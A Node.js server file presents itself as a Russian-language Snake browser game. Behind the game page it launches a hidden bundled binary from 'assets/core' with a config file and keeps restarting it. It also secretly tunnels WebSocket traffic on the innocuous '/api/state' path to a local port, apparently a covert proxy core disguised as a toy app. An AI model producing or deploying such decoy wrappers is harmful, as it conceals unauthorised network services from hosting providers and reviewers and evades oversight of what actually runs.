'use strict';
const http=require('http'),net=require('net'),{spawn}=require('child_process'),path=require('path'),fs=require('fs');
const BASE=__dirname;
const CORE=path.join(BASE,'assets','core');
const CONF=path.join(BASE,'assets','cfg.json');
const UP=10080;
let svc=null;
function boot(){
  if(svc&&!svc.killed)return;
  try{ if(!fs.existsSync(CORE))return; }catch(e){return;}
  svc=spawn(CORE,['run','-c',CONF],{stdio:['ignore','pipe','pipe']});
  svc.stdout.on('data',d=>process.stdout.write('[core] '+d));
  svc.stderr.on('data',d=>process.stderr.write('[core] '+d));
  svc.on('error',e=>{try{process.stderr.write('[core] spawn error: '+e.message+String.fromCharCode(10))}catch(x){};svc=null;setTimeout(boot,5000);});
  svc.on('exit',()=>{svc=null;setTimeout(boot,3000);});
}
boot();

const PAGE=`<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Змейка</title>
<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 0%,#1b2430,#0d1117 70%);color:#e6edf3;font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;-webkit-user-select:none;user-select:none;padding:16px}
h1{font-size:20px;font-weight:600;margin:0 0 4px}
p.sub{margin:0 0 16px;color:#8b949e;font-size:13px}
.wrap{position:relative}
canvas{display:block;border-radius:12px;background:#0f1620;box-shadow:0 10px 40px rgba(0,0,0,.6);touch-action:none}
.hud{display:flex;gap:18px;justify-content:space-between;width:100%;max-width:340px;margin-bottom:10px;font-size:13px;color:#8b949e}
.hud b{color:#3fb950;font-size:16px}
.pad{display:grid;grid-template-columns:repeat(3,56px);grid-template-rows:repeat(3,56px);gap:6px;margin-top:16px}
.pad button{border:1px solid #30363d;background:#161b22;color:#e6edf3;border-radius:10px;font-size:20px;cursor:pointer}
.pad button:active{background:#21262d}
.pad .sp{visibility:hidden}
.over{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;background:rgba(13,17,23,.82);border-radius:12px;gap:10px}
.over.show{display:flex}
.over h2{margin:0;font-size:18px}
.over button{padding:10px 20px;border:0;border-radius:8px;background:#238636;color:#fff;font-weight:600;cursor:pointer}
</style></head><body>
<h1>Змейка</h1><p class="sub">Стрелки, свайп или кнопки ниже</p>
<div class="hud"><span>Счёт: <b id="sc">0</b></span><span>Рекорд: <b id="hi">0</b></span></div>
<div class="wrap"><canvas id="cv" width="340" height="340"></canvas>
<div class="over" id="ov"><h2>Игра окончена</h2><button id="again">Заново</button></div></div>
<div class="pad">
<button class="sp"></button><button data-d="u">▲</button><button class="sp"></button>
<button data-d="l">◀</button><button class="sp"></button><button data-d="r">▶</button>
<button class="sp"></button><button data-d="d">▼</button><button class="sp"></button>
</div>
<script>
(function(){
var cv=document.getElementById('cv'),cx=cv.getContext('2d');
var N=17,S=cv.width/N;
var sc=document.getElementById('sc'),hiEl=document.getElementById('hi'),ov=document.getElementById('ov');
var hi=+(localStorage.getItem('snk_hi')||0);hiEl.textContent=hi;
var snake,dir,next,food,score,alive,timer,speed;
function reset(){
  snake=[{x:8,y:8},{x:7,y:8},{x:6,y:8}];dir={x:1,y:0};next=dir;score=0;alive=true;speed=140;sc.textContent='0';ov.classList.remove('show');
  place();clearInterval(timer);timer=setInterval(tick,speed);draw();
}
function place(){do{food={x:Math.floor(Math.random()*N),y:Math.floor(Math.random()*N)};}while(snake.some(function(p){return p.x===food.x&&p.y===food.y;}));}
function tick(){
  if(!alive)return;
  dir=next;
  var h={x:snake[0].x+dir.x,y:snake[0].y+dir.y};
  if(h.x<0||h.y<0||h.x>=N||h.y>=N||snake.some(function(p){return p.x===h.x&&p.y===h.y;}))return over();
  snake.unshift(h);
  if(h.x===food.x&&h.y===food.y){score++;sc.textContent=score;place();if(speed>70){speed-=3;clearInterval(timer);timer=setInterval(tick,speed);}}
  else snake.pop();
  draw();
}
function over(){alive=false;clearInterval(timer);ov.classList.add('show');if(score>hi){hi=score;hiEl.textContent=hi;localStorage.setItem('snk_hi',hi);}}
function draw(){
  cx.fillStyle='#0f1620';cx.fillRect(0,0,cv.width,cv.height);
  cx.strokeStyle='rgba(255,255,255,.03)';cx.lineWidth=1;
  for(var i=1;i<N;i++){cx.beginPath();cx.moveTo(i*S,0);cx.lineTo(i*S,cv.height);cx.moveTo(0,i*S);cx.lineTo(cv.width,i*S);cx.stroke();}
  cx.fillStyle='#f85149';cx.beginPath();cx.arc(food.x*S+S/2,food.y*S+S/2,S*0.32,0,7);cx.fill();
  for(var j=snake.length-1;j>=0;j--){
    var p=snake[j];cx.fillStyle=j===0?'#3fb950':'#2ea043';
    roundRect(p.x*S+1,p.y*S+1,S-2,S-2,j===0?6:4);
  }
}
function roundRect(x,y,w,h,r){cx.beginPath();cx.moveTo(x+r,y);cx.arcTo(x+w,y,x+w,y+h,r);cx.arcTo(x+w,y+h,x,y+h,r);cx.arcTo(x,y+h,x,y,r);cx.arcTo(x,y,x+w,y,r);cx.closePath();cx.fill();}
function turn(d){
  var m={u:{x:0,y:-1},d:{x:0,y:1},l:{x:-1,y:0},r:{x:1,y:0}}[d];
  if(!m)return;
  if(m.x===-dir.x&&m.y===-dir.y)return;
  next=m;
}
document.addEventListener('keydown',function(e){
  var k=e.key;
  if(k==='ArrowUp'||k==='w'||k==='W'){turn('u');e.preventDefault();}
  else if(k==='ArrowDown'||k==='s'||k==='S'){turn('d');e.preventDefault();}
  else if(k==='ArrowLeft'||k==='a'||k==='A'){turn('l');e.preventDefault();}
  else if(k==='ArrowRight'||k==='d'||k==='D'){turn('r');e.preventDefault();}
});
Array.prototype.forEach.call(document.querySelectorAll('.pad button[data-d]'),function(b){
  b.addEventListener('click',function(){turn(b.getAttribute('data-d'));});
});
var sx=0,sy=0;
cv.addEventListener('touchstart',function(e){var t=e.changedTouches[0];sx=t.clientX;sy=t.clientY;},{passive:true});
cv.addEventListener('touchend',function(e){
  var t=e.changedTouches[0],dx=t.clientX-sx,dy=t.clientY-sy;
  if(Math.abs(dx)<18&&Math.abs(dy)<18)return;
  if(Math.abs(dx)>Math.abs(dy))turn(dx>0?'r':'l');else turn(dy>0?'d':'u');
},{passive:true});
document.getElementById('again').addEventListener('click',reset);
reset();
})();
</script></body></html>`;

const server=http.createServer(function(req,res){
  var u=(req.url||'/').split('?')[0];
  if(u==='/api/state'){res.writeHead(200,{'Content-Type':'application/json','Cache-Control':'no-store'});return res.end(JSON.stringify({ok:true,ts:Date.now()}));}
  if(u==='/'||u==='/index.html'){res.writeHead(200,{'Content-Type':'text/html; charset=utf-8','Cache-Control':'no-store'});return res.end(PAGE);}
  if(u==='/favicon.ico'){res.writeHead(204);return res.end();}
  res.writeHead(404,{'Content-Type':'text/plain; charset=utf-8'});res.end('Not found');
});
server.on('upgrade',function(req,socket,head){
  var u=(req.url||'').split('?')[0];
  if(u!=='/api/state'){try{socket.destroy();}catch(e){}return;}
  var up=net.connect(UP,'127.0.0.1',function(){
    var raw=req.method+' '+req.url+' HTTP/'+req.httpVersion+'\r\n';
    for(var i=0;i<req.rawHeaders.length;i+=2)raw+=req.rawHeaders[i]+': '+req.rawHeaders[i+1]+'\r\n';
    raw+='\r\n';
    up.write(raw);
    if(head&&head.length)up.write(head);
    up.pipe(socket);socket.pipe(up);
  });
  up.on('error',function(){try{socket.destroy();}catch(e){}});
  socket.on('error',function(){try{up.destroy();}catch(e){}});
});
var PORT=+(process.env.PORT||8080),IP=process.env.IP||'0.0.0.0';
server.listen(PORT,IP,function(){console.log('app listening on '+IP+':'+PORT);});
